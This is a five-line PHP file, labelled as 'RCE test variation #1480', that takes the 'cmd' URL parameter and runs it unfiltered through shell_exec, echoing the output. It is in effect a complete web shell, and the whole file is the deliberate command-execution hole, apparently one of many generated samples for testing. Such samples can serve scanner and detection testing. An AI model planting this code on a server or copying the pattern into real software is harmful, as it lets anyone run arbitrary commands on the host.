<?php
// RCE test variation #1480
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>